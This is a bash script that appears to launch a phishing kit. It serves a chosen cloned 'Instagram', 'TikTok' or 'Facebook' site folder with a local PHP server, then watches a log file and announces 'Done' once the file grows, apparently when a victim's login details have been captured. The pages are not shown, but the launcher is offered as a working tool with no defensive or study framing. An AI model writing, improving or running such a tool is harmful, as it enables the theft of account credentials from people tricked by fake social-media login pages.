#!/usr/bin/env bash

HOST="127.0.0.1"
PORT=8080
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
LOG_FILE="$SCRIPT_DIR/log.txt"

start() {
    cat << 'EOF'
  ______          ______      ______      __       __
 /_  __/______  _/_  __/___  / ____/___ _/ /______/ /_
  / / / ___/ / / // / / __ \/ /   / __ `/ __/ ___/ __ \
 / / / /  / /_/ // / / /_/ / /___/ /_/ / /_/ /__/ / / /
/_/ /_/   \__, //_/  \____/\____/\__,_/\__/\___/_/ /_/
         /____/
EOF
}

declare -A SITE_NAMES=(
    [1]="Instagram site"
    [2]="Tik Tok site"
    [3]="Facebook site"
)

declare -A SITE_PATHS=(
    [1]="sites/instagram"
    [2]="sites/tiktok"
    [3]="sites/facebook"
)

CHOSEN_DIR=""
PHP_PID=""

choose_site() {
    echo ""
    echo "Choose site:"
    echo ""
    echo "[1] Instagram site"
    echo "[2] Tik Tok site"
    echo "[3] Facebook site"
    echo "[q] Quit"

    while true; do
        read -rp "> " choice
        choice="${choice,,}"

        if [[ "$choice" == "q" || "$choice" == "quit" || "$choice" == "exit" ]]; then
            exit 0
        fi

        if [[ -n "${SITE_PATHS[$choice]}" ]]; then
            local site_dir
            site_dir="$(realpath "${SITE_PATHS[$choice]}" 2>/dev/null)"
            if [[ -d "$site_dir" ]]; then
                CHOSEN_DIR="$site_dir"
                return
            else
                echo "Folder not found: ${SITE_PATHS[$choice]}"
            fi
        else
            echo "Invalid choice"
        fi
    done
}

watch_log() {
    local last_size
    last_size=$(wc -c < "$LOG_FILE" 2>/dev/null || echo 0)

    while true; do
        sleep 1
        local current_size
        current_size=$(wc -c < "$LOG_FILE" 2>/dev/null || echo 0)

        if [[ "$current_size" -gt "$last_size" ]]; then
            echo ""
            echo "Done"
            echo "Path: $LOG_FILE"
            kill "$PHP_PID" 2>/dev/null
            exit 0
        fi
    done
}

run_php_server() {
    local site_dir="$1"
    cd "$site_dir" || exit 1

    echo ""
    echo "Starting PHP server"
    echo "http://$HOST:$PORT"
    echo "Ctrl+C to stop"
    echo ""

    php -S "$HOST:$PORT" > /dev/null 2>&1 &
    PHP_PID=$!

    watch_log &

    trap 'echo ""; echo "Stopping..."; kill "$PHP_PID" 2>/dev/null; exit 0' INT

    wait "$PHP_PID"
}

start

if [[ ! -f "$LOG_FILE" ]]; then
    touch "$LOG_FILE"
fi

choose_site
run_php_server "$CHOSEN_DIR"